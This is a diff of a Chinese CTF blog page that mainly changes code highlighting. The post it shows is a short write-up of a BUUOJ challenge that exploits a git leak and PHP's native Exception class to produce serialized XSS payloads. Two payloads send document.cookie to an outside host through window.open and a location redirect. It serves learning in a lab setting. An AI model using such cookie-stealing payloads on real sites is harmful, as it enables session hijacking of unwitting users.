@@ -29,7 +29,15 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/base16/-gigavolt.min.css" />
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
+      
+      
     
   
 
@@ -191,7 +199,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      169 字
+      150 字
     </span>
   
 
@@ -201,7 +209,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      5
+      4
        分钟
     </span>
   
@@ -241,23 +249,23 @@
               <h2 id="‘-‘-‘"><a href="#‘-‘-‘" class="headerlink" title="‘-‘-‘"></a>‘-‘-‘</h2><p><img src="https://ftp.bmp.ovh/imgs/2021/04/6b7c495f5410b55c.png" srcset="/img/loading.gif"><br>打开就个这<br>其他什么也没<br>dirsearch扫的话会429，加-s还是会429？？？<br>看了WP是git泄露<br>githack一下<br><img src="https://ftp.bmp.ovh/imgs/2021/04/92d01a33b6c1a59a.png" srcset="/img/loading.gif"><br><img src="https://ftp.bmp.ovh/imgs/2021/04/15257587e78dc396.png" srcset="/img/loading.gif"><br>就这？？<br>没类？？     </p>
 <p>用原生类—<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/class.exception.php">Exception</a>—所有异常的基类     </p>
 <p>然后弹cookie    </p>
-<div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-$a=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;</span>);
-<span class="hljs-keyword">echo</span> urlencode(serialize($a));
+<pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"&lt;script>alert(document.cookie)&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-<span class="hljs-meta">?&gt;</span></code></pre></div></code></pre>
+<span class="token delimiter important">?></span></span> </code></pre></code></pre>
 <p><code>window.open</code>—–&gt;打开新窗口     </p>
-<div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-$a=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;&lt;script&gt;window.open(&#x27;http://cfde3d9f-8b17-4812-8626-a978cefef14d.node3.buuoj.cn/&#x27;+document.cookie);&lt;/script&gt;&quot;</span>);
-<span class="hljs-keyword">echo</span> urlencode(serialize($a));
+<pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"&lt;script>window.open('http://cfde3d9f-8b17-4812-8626-a978cefef14d.node3.buuoj.cn/'+document.cookie);&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-<span class="hljs-meta">?&gt;</span></code></pre></div></code></pre>
+<span class="token delimiter important">?></span></span> </code></pre></code></pre>
 <p><code>window.location.href=&#39;url&#39;</code>—-&gt;实现恶意跳转       </p>
-<div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-$a=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;&lt;script&gt;window.location.href=&#x27;http://cfde3d9f-8b17-4812-8626-a978cefef14d.node3.buuoj.cn/&#x27;+document.cookie&lt;/script&gt;&quot;</span>);
-<span class="hljs-keyword">echo</span> urlencode(serialize($a));
+<pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"&lt;script>window.location.href='http://cfde3d9f-8b17-4812-8626-a978cefef14d.node3.buuoj.cn/'+document.cookie&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-<span class="hljs-meta">?&gt;</span></code></pre></div></code></pre>
+<span class="token delimiter important">?></span></span> </code></pre></code></pre>
 <h2 id="芝士·"><a href="#芝士·" class="headerlink" title="芝士·"></a>芝士·</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45521281/article/details/105812056">利用php的原生类进行XSS</a></p>
 
             </div>
@@ -403,6 +411,8 @@ $a=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</
 
 
 
+  
+    
   
 
 
